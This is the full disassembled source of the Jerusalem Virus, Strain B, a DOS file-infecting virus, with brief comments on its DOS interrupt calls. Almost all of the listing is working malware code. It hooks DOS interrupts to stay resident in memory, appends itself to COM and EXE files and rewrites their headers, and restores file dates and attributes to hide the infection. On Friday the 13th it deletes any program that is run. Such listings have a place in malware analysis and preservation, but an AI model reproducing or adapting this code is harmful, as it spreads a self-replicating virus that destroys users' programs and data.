PAGE  59,132

;*****************************************************************************
;                           Jerusalem Virus - Strain B
;
;                          Disassembled and commented by:
;
;                               - Captain Morgan -
;*****************************************************************************


.286c

data_1e         equ     2Ch
data_2e         equ     43h
data_3e         equ     45h
data_4e         equ     47h
data_5e         equ     49h
data_6e         equ     51h
data_7e         equ     53h
data_8e         equ     57h
data_9e         equ     5Dh
data_10e        equ     5Fh
data_11e        equ     61h
data_12e        equ     63h
data_13e        equ     65h
data_14e        equ     78h
data_15e        equ     7Ah
data_16e        equ     7Ch
data_17e        equ     7Eh
data_18e        equ     0Ah
data_19e        equ     0Ch
data_20e        equ     0Eh
data_21e        equ     0Fh
data_22e        equ     11h
data_23e        equ     13h
data_24e        equ     15h
data_25e        equ     17h
data_26e        equ     19h
data_27e        equ     1Bh
data_28e        equ     1Dh
data_29e        equ     1Fh
data_30e        equ     29h
data_31e        equ     2Bh
data_32e        equ     2Dh
data_33e        equ     2Fh
data_34e        equ     31h
data_35e        equ     33h
data_36e        equ     4Eh
data_37e        equ     70h
data_38e        equ     72h
data_39e        equ     74h
data_40e        equ     76h
data_41e        equ     7Ah
data_42e        equ     80h
data_43e        equ     82h
data_44e        equ     8Fh

seg_a           segment
                assume  cs:seg_a, ds:seg_a


                org     100h

je              proc    far

start:
                jmp     loc_2                   ; (0195)
                db      73h, 55h, 4Dh, 73h, 44h, 6Fh
                db      73h, 0, 1, 0EBh, 21h, 0
                db      0, 0, 0ABh, 0Bh, 2Ch, 2
                db      70h, 0, 92h, 0Eh, 29h, 1Ah
                db      0EBh, 4, 59h, 6Fh, 0A8h
                db      7Bh
                db      13 dup (0)
                db      0E8h, 6, 0D7h, 62h, 21h, 80h
                db      0, 0, 0, 80h, 0, 62h
                db      21h, 5Ch, 0, 62h, 21h, 6Ch
                db      0, 62h, 21h, 10h, 7, 60h
                db      5Bh, 0C5h, 0, 60h, 5Bh, 0
                db      0F0h, 6, 0, 4Dh, 5Ah, 30h
                db      0, 53h, 0, 1Fh, 0, 20h
                db      0, 0, 0, 0FFh, 0FFh, 0B2h
                db      9, 10h, 7, 84h, 19h, 0C5h
                db      0, 0B2h, 9, 20h, 0, 0
                db      0, 2Eh, 0Dh, 0Ah, 0, 0
                db      5, 0, 20h, 0, 26h, 12h
                db      46h, 0A3h, 0, 2, 10h, 0
                db      20h, 9Dh, 0, 0, 7Bh, 3Dh
                db      2Eh, 9Bh
                db      'COMMAND.COM'
                db      1, 0, 0, 0, 0, 0
loc_2:
                cld                             ; Clear direction
                mov     ah,0E0h
                int     21h                     ; DOS Services  ah=function E0h
                cmp     ah,0E0h
                jae     loc_3                   ; Jump if above or =
                cmp     ah,3
                jb      loc_3                   ; Jump if below
                mov     ah,0DDh
                mov     di,100h
                mov     si,710h
                add     si,di
                mov     cx,cs:[di+11h]
                nop                             ;*Fixup for MASM (M)
                int     21h                     ; DOS Services  ah=function DDh
loc_3:
                mov     ax,cs
                add     ax,10h
                mov     ss,ax
                mov     sp,700h
loc_4:
                push    ax
                mov     ax,0C5h
                push    ax
                retf                            ; Return far
                db      0FCh, 6, 2Eh, 8Ch, 6, 31h
                db      0, 2Eh, 8Ch, 6, 39h, 0
                db      2Eh, 8Ch, 6, 3Dh, 0, 2Eh
                db      8Ch, 6, 41h, 0, 8Ch, 0C0h
                db      5, 10h, 0, 2Eh, 1, 6
                db      49h, 0, 2Eh, 1, 6, 45h
                db      0, 0B4h, 0E0h, 0CDh, 21h, 80h
                db      0FCh, 0E0h, 73h, 13h, 80h, 0FCh
                db      3, 7, 2Eh, 8Eh, 16h, 45h
                db      0, 2Eh, 8Bh, 26h, 43h, 0
                db      2Eh, 0FFh, 2Eh, 47h, 0, 33h
                db      0C0h, 8Eh, 0C0h, 26h, 0A1h, 0FCh
                db      3, 2Eh, 0A3h, 4Bh, 0, 26h
                db      0A0h, 0FEh, 3, 2Eh, 0A2h, 4Dh
                db      0
                db      26h

je              endp

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
;                       External Entry Point
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

int_24h_entry   proc    far
                mov     word ptr ds:[3FCh],0A5F3h
                mov     byte ptr es:data_47,0CBh
                pop     ax
                add     ax,10h
                mov     es,ax
                push    cs
                pop     ds
                mov     cx,710h
                shr     cx,1                    ; Shift w/zeros fill
                xor     si,si                   ; Zero register
                mov     di,si
                push    es
                mov     ax,142h
                push    ax
;*              jmp     far ptr loc_1           ;*(0000:03FC)
                db      0EAh, 0FCh, 3, 0, 0
                db      8Ch, 0C8h, 8Eh, 0D0h, 0BCh, 0
                db      7, 33h, 0C0h, 8Eh, 0D8h, 2Eh
                db      0A1h, 4Bh, 0, 0A3h, 0FCh, 3
                db      2Eh, 0A0h, 4Dh, 0, 0A2h, 0FEh
                db      3
int_24h_entry   endp


;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
;                       External Entry Point
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

int_21h_entry   proc    far
                mov     bx,sp
                mov     cl,4
                shr     bx,cl                   ; Shift w/zeros fill
                add     bx,10h
                mov     cs:data_35e,bx
                mov     ah,4Ah                  ; 'J'
                mov     es,cs:data_34e
                int     21h                     ; DOS Services  ah=function 4Ah
                                                ;  change mem allocation, bx=siz
                mov     ax,3521h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     cs:data_25e,bx
                mov     cs:data_26e,es
                push    cs
                pop     ds
                mov     dx,25Bh
                mov     ax,2521h
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                mov     es,ds:data_34e
                mov     es,es:data_1e
                xor     di,di                   ; Zero register
                mov     cx,7FFFh
                xor     al,al                   ; Zero register

locloop_5:
                repne   scasb                   ; Rep zf=0+cx >0 Scan es:[di] for al
                cmp     es:[di],al
                loopnz  locloop_5               ; Loop if zf=0, cx>0

                mov     dx,di
                add     dx,3
                mov     ax,4B00h
                push    es
                pop     ds
                push    cs
                pop     es
                mov     bx,35h
                push    ds
                push    es
                push    ax
                push    bx
                push    cx
                push    dx
                mov     ah,2Ah                  ; '*'
                int     21h                     ; DOS Services  ah=function 2Ah
                                                ;  get date, cx=year, dx=mon/day
                mov     byte ptr cs:data_20e,0
                cmp     cx,7C3h
                je      loc_7                   ; Jump if equal
                cmp     al,5                    ; Check to see if it's Friday
                jne     loc_6                   ; Jump if not equal
                cmp     dl,0Dh                  ; Check to see if it's the 13th
                jne     loc_6                   ; Jump if not equal
                inc     byte ptr cs:data_20e
                jmp     short loc_7             ; (02F7)
                db      90h
loc_6:
                mov     ax,3508h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     cs:data_23e,bx
                mov     cs:data_24e,es
                push    cs
                pop     ds
                mov     word ptr ds:data_29e,7E90h
                mov     ax,2508h
                mov     dx,21Eh
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
loc_7:
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     es
                pop     ds
                pushf                           ; Push flags
                call    dword ptr cs:data_25e
                push    ds
                pop     es
                mov     ah,49h                  ; 'I'
                int     21h                     ; DOS Services  ah=function 49h
                                                ;  release memory block, es=seg
                mov     ah,4Dh                  ; 'M'
                int     21h                     ; DOS Services  ah=function 4Dh
                                                ;  get return code info in ax
                mov     ah,31h                  ; '1'
                mov     dx,600h
                mov     cl,4
                shr     dx,cl                   ; Shift w/zeros fill
                add     dx,10h
                int     21h                     ; DOS Services  ah=function 31h
                                                ;  terminate & stay resident
                db      32h, 0C0h, 0CFh, 2Eh, 83h, 3Eh
                db      1Fh, 0, 2, 75h, 17h, 50h
                db      53h, 51h, 52h, 55h, 0B8h, 2
                db      6, 0B7h, 87h, 0B9h, 5, 5
                db      0BAh, 10h, 10h, 0CDh, 10h, 5Dh
                db      5Ah, 59h, 5Bh, 58h, 2Eh, 0FFh
                db      0Eh, 1Fh, 0, 75h, 12h, 2Eh
                db      0C7h, 6, 1Fh, 0, 1, 0
                db      50h, 51h, 56h, 0B9h, 1, 40h
                db      0F3h, 0ACh
                db      5Eh, 59h, 58h
loc_8:
                jmp     dword ptr cs:data_23e
                db      9Ch, 80h, 0FCh, 0E0h, 75h, 5
                db      0B8h, 0, 3, 9Dh, 0CFh, 80h
                db      0FCh, 0DDh, 74h, 13h, 80h, 0FCh
                db      0DEh, 74h, 28h, 3Dh, 0, 4Bh
                db      75h, 3, 0E9h, 0B4h, 0
loc_9:
                popf                            ; Pop flags
                jmp     dword ptr cs:data_25e
loc_10:
                pop     ax
                pop     ax
                mov     ax,100h
                mov     cs:data_18e,ax
                pop     ax
                mov     cs:data_19e,ax
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                popf                            ; Pop flags
                mov     ax,cs:data_21e
                jmp     dword ptr cs:data_18e
loc_11:
                add     sp,6
                popf                            ; Pop flags
                mov     ax,cs
                mov     ss,ax
                mov     sp,710h
                push    es
                push    es
                xor     di,di                   ; Zero register
                push    cs
                pop     es
                mov     cx,10h
                mov     si,bx
                mov     di,21h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                mov     ax,ds
                mov     es,ax
                mul     word ptr cs:data_41e    ; ax = data * ax
                add     ax,cs:data_31e
                adc     dx,0
                div     word ptr cs:data_41e    ; ax,dxrem=dx:ax/data
                mov     ds,ax
                mov     si,dx
                mov     di,dx
                mov     bp,es
                mov     bx,cs:data_33e
                or      bx,bx                   ; Zero ?
                jz      loc_13                  ; Jump if zero
loc_12:
                mov     cx,8000h
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                add     ax,1000h
                add     bp,1000h
                mov     ds,ax
                mov     es,bp
                dec     bx
                jnz     loc_12                  ; Jump if not zero
loc_13:
                mov     cx,cs:data_32e
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                pop     ax
                push    ax
                add     ax,10h
                add     cs:data_30e,ax
data_47         db      2Eh
                db      1, 6, 25h, 0, 2Eh, 0A1h
                db      21h, 0, 1Fh, 7, 2Eh, 8Eh
                db      16h, 29h, 0, 2Eh, 8Bh, 26h
                db      27h, 0, 2Eh, 0FFh, 2Eh, 23h
                db      0
loc_14:
                xor     cx,cx                   ; Zero register
                mov     ax,4301h
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                mov     ah,41h                  ; 'A'
                int     21h                     ; DOS Services  ah=function 41h
                                                ;  delete file, name @ ds:dx
                mov     ax,4B00h
                popf                            ; Pop flags
                jmp     dword ptr cs:data_25e
loc_15:
                cmp     byte ptr cs:data_20e,1
                je      loc_14                  ; Jump if equal
                mov     word ptr cs:data_37e,0FFFFh
                mov     word ptr cs:data_44e,0
                mov     cs:data_42e,dx
                mov     cs:data_43e,ds
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                cld                             ; Clear direction
                mov     di,dx
                xor     dl,dl                   ; Zero register
                cmp     byte ptr [di+1],3Ah     ; ':'
                jne     loc_16                  ; Jump if not equal
                mov     dl,[di]
                and     dl,1Fh
loc_16:
                mov     ah,36h                  ; '6'
                int     21h                     ; DOS Services  ah=function 36h
                                                ;  get free space, drive dl,1=a:
                cmp     ax,0FFFFh
                jne     loc_18                  ; Jump if not equal
loc_17:
                jmp     loc_44                  ; (06E7)
loc_18:
                mul     bx                      ; dx:ax = reg * ax
                mul     cx                      ; dx:ax = reg * ax
                or      dx,dx                   ; Zero ?
                jnz     loc_19                  ; Jump if not zero
                cmp     ax,710h
                jb      loc_17                  ; Jump if below
loc_19:
                mov     dx,cs:data_42e
                push    ds
                pop     es
                xor     al,al                   ; Zero register
                mov     cx,41h
                repne   scasb                   ; Rep zf=0+cx >0 Scan es:[di] for al
                mov     si,cs:data_42e
loc_20:
                mov     al,[si]
                or      al,al                   ; Zero ?
                jz      loc_22                  ; Jump if zero
                cmp     al,61h                  ; 'a'
                jb      loc_21                  ; Jump if below
                cmp     al,7Ah                  ; 'z'
                ja      loc_21                  ; Jump if above
                sub     byte ptr [si],20h       ; ' '
loc_21:
                inc     si
                jmp     short loc_20            ; (0490)
loc_22:
                mov     cx,0Bh
                sub     si,cx
                mov     di,84h
                push    cs
                pop     es
                mov     cx,0Bh
                repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
                jnz     loc_23                  ; Jump if not zero
                jmp     loc_44                  ; (06E7)
loc_23:
                mov     ax,4300h
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                jc      loc_24                  ; Jump if carry Set
                mov     cs:data_38e,cx
loc_24:
                jc      loc_26                  ; Jump if carry Set
                xor     al,al                   ; Zero register
                mov     cs:data_36e,al
                push    ds
                pop     es
                mov     di,dx
                mov     cx,41h
                repne   scasb                   ; Rep zf=0+cx >0 Scan es:[di] for al
                cmp     byte ptr [di-2],4Dh     ; 'M'
                je      loc_25                  ; Jump if equal
                cmp     byte ptr [di-2],6Dh     ; 'm'
                je      loc_25                  ; Jump if equal
                inc     byte ptr cs:data_36e
loc_25:
                mov     ax,3D00h
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
loc_26:
                jc      loc_28                  ; Jump if carry Set
                mov     cs:data_37e,ax
                mov     bx,ax
                mov     ax,4202h
                mov     cx,0FFFFh
                mov     dx,0FFFBh
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_26                  ; Jump if carry Set
                add     ax,5
                mov     cs:data_22e,ax
                mov     cx,5
                mov     dx,6Bh
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                mov     ah,3Fh                  ; '?'
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                mov     di,dx
                mov     si,5
                repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
                jnz     loc_27                  ; Jump if not zero
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                jmp     loc_44                  ; (06E7)
loc_27:
                mov     ax,3524h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     ds:data_27e,bx
                mov     ds:data_28e,es
                mov     dx,21Bh
                mov     ax,2524h
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                lds     dx,dword ptr ds:data_42e        ; Load 32 bit ptr
                xor     cx,cx                   ; Zero register
                mov     ax,4301h
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
loc_28:
                jc      loc_29                  ; Jump if carry Set
                mov     bx,cs:data_37e
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                mov     word ptr cs:data_37e,0FFFFh
                mov     ax,3D02h
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                jc      loc_29                  ; Jump if carry Set
                mov     cs:data_37e,ax
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                mov     bx,ds:data_37e
                mov     ax,5700h
                int     21h                     ; DOS Services  ah=function 57h
                                                ;  get/set file date & time
                mov     ds:data_39e,dx
                mov     ds:data_40e,cx
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
loc_29:
                jc      loc_32                  ; Jump if carry Set
                cmp     byte ptr ds:data_36e,0
                je      loc_30                  ; Jump if equal
                jmp     short loc_34            ; (05E6)
                db      90h
loc_30:
                mov     bx,1000h
                mov     ah,48h                  ; 'H'
                int     21h                     ; DOS Services  ah=function 48h
                                                ;  allocate memory, bx=bytes/16
                jnc     loc_31                  ; Jump if carry=0
                mov     ah,3Eh                  ; '>'
                mov     bx,ds:data_37e
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                jmp     loc_44                  ; (06E7)
loc_31:
                inc     word ptr ds:data_44e
                mov     es,ax
                xor     si,si                   ; Zero register
                mov     di,si
                mov     cx,710h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                mov     dx,di
                mov     cx,ds:data_22e
                mov     bx,ds:data_37e
                push    es
                pop     ds
                mov     ah,3Fh                  ; '?'
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
loc_32:
                jc      loc_33                  ; Jump if carry Set
                add     di,cx
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                mov     ax,4200h
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                mov     si,5
                mov     cx,5
                rep     movs  byte ptr es:[di],cs:[si]  ; Rep when cx >0 Mov [si] to es:[di]
                mov     cx,di
                xor     dx,dx                   ; Zero register
                mov     ah,40h                  ; '@'
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
loc_33:
                jc      loc_35                  ; Jump if carry Set
                jmp     loc_42                  ; (06A2)
loc_34:
                mov     cx,1Ch
                mov     dx,4Fh
                mov     ah,3Fh                  ; '?'
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
loc_35:
                jc      loc_37                  ; Jump if carry Set
                mov     word ptr ds:data_11e,1984h
                mov     ax,ds:data_9e
                mov     ds:data_3e,ax
                mov     ax,ds:data_10e
                mov     ds:data_2e,ax
                mov     ax,ds:data_12e
                mov     ds:data_4e,ax
                mov     ax,ds:data_13e
                mov     ds:data_5e,ax
                mov     ax,ds:data_7e
                cmp     word ptr ds:data_6e,0
                je      loc_36                  ; Jump if equal
                dec     ax
loc_36:
                mul     word ptr ds:data_14e    ; ax = data * ax
                add     ax,ds:data_6e
                adc     dx,0
                add     ax,0Fh
                adc     dx,0
                and     ax,0FFF0h
                mov     ds:data_16e,ax
                mov     ds:data_17e,dx
                add     ax,710h
                adc     dx,0
loc_37:
                jc      loc_39                  ; Jump if carry Set
                div     word ptr ds:data_14e    ; ax,dxrem=dx:ax/data
                or      dx,dx                   ; Zero ?
                jz      loc_38                  ; Jump if zero
                inc     ax
loc_38:
                mov     ds:data_7e,ax
                mov     ds:data_6e,dx
                mov     ax,ds:data_16e
                mov     dx,ds:data_17e
                div     word ptr ds:data_15e    ; ax,dxrem=dx:ax/data
                sub     ax,ds:data_8e
                mov     ds:data_13e,ax
                mov     word ptr ds:data_12e,0C5h
                mov     ds:data_9e,ax
                mov     word ptr ds:data_10e,710h
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                mov     ax,4200h
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
loc_39:
                jc      loc_40                  ; Jump if carry Set
                mov     cx,1Ch
                mov     dx,4Fh
                mov     ah,40h                  ; '@'
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
loc_40:
                jc      loc_41                  ; Jump if carry Set
                cmp     ax,cx
                jne     loc_42                  ; Jump if not equal
                mov     dx,ds:data_16e
                mov     cx,ds:data_17e
                mov     ax,4200h
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
loc_41:
                jc      loc_42                  ; Jump if carry Set
                xor     dx,dx                   ; Zero register
                mov     cx,710h
                mov     ah,40h                  ; '@'
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
loc_42:
                cmp     word ptr cs:data_44e,0
                je      loc_43                  ; Jump if equal
                mov     ah,49h                  ; 'I'
                int     21h                     ; DOS Services  ah=function 49h
                                                ;  release memory block, es=seg
loc_43:
                cmp     word ptr cs:data_37e,0FFFFh
                je      loc_44                  ; Jump if equal
                mov     bx,cs:data_37e
                mov     dx,cs:data_39e
                mov     cx,cs:data_40e
                mov     ax,5701h
                int     21h                     ; DOS Services  ah=function 57h
                                                ;  get/set file date & time
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                lds     dx,dword ptr cs:data_42e        ; Load 32 bit ptr
                mov     cx,cs:data_38e
                mov     ax,4301h
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                lds     dx,dword ptr cs:data_27e        ; Load 32 bit ptr
                mov     ax,2524h
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
loc_44:
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf                            ; Pop flags
                jmp     dword ptr cs:data_25e
                db      11 dup (0)
                db      4Dh, 63h, 21h, 4
                db      13 dup (0)
                db      5Bh, 0, 0, 0, 2Bh, 0
                db      0FFh
                db      17 dup (0FFh)
                db      'E:\SV\EXECDOS.BAT'
                db      0
                db      'EXECDOS', 0Dh
                db      0, 7Dh, 0, 0, 80h, 0
                db      53h, 0Eh, 5Ch, 0, 53h, 0Eh
                db      6Ch, 4Dh, 63h, 21h, 0, 10h
                db      'EC=F:\DOS\C'
                db      0E9h, 92h, 0, 73h, 55h, 4Dh
                db      73h, 44h, 6Fh, 73h, 0, 1
                db      0B8h, 22h, 0, 0, 0, 1Ah
                db      3, 2Ch, 2, 70h, 0
loc_45:
                xchg    ax,dx
                push    cs
                sub     [bp+si],bx
;*              jmp     short loc_46            ;*(0781)
                db      0EBh, 4
                db      63h, 21h, 0D0h, 59h
int_21h_entry   endp


seg_a           ends



                end     start
